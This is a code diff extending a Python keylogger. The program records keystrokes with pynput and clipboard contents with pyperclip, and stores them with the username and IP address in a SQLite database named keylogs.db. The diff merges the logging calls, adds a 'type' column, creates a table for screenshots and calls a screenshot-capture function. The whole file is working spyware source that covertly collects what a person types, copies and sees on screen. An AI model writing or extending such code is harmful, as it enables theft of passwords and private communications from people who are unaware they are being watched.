@@ -1,10 +1,13 @@
+# app.py
+
 import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
 import pyperclip
-from logData.logger import log_clipboard, log_sentence
-import re
+from logData.logger import log_all
+from screenshot import capture_screenshots
+
 
 # Database setup
 DB_FILE = "./db/keylogs.db"
@@ -19,7 +22,8 @@ def create_database():
             timestamp TEXT,
             username TEXT,
             ip TEXT,
-            text TEXT
+            text TEXT,
+            type TEXT
         )
         """
     )
@@ -29,7 +33,20 @@ def create_database():
             timestamp TEXT,
             username TEXT,
             ip TEXT,
-            text TEXT
+            text TEXT,
+            type TEXT
+        )
+        """
+    )
+    c.execute(
+        """
+        CREATE TABLE IF NOT EXISTS screenshot_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT,
+            type TEXT,
+            image_path TEXT
         )
         """
     )
@@ -64,7 +81,7 @@ def log_buffer():
     global buffer
     if buffer:
         sentence = "".join(buffer)
-        log_sentence(sentence)
+        log_all(sentence, "keystroke")
         buffer = []
 
 
@@ -100,11 +117,15 @@ def on_release(key):
     try:
         clipboard_text = pyperclip.paste()
         if clipboard_text:
-            log_clipboard(clipboard_text)
+            log_all(clipboard_text, "clipboard")
     except pyperclip.PyperclipException as e:
         print(f"Error capturing clipboard: {e}")
 
 
-# Start listening to keyboard events
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+if __name__ == "__main__":
+    # Start logging keystrokes and clipboard data
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    # Start capturing screenshots
+    capture_screenshots()
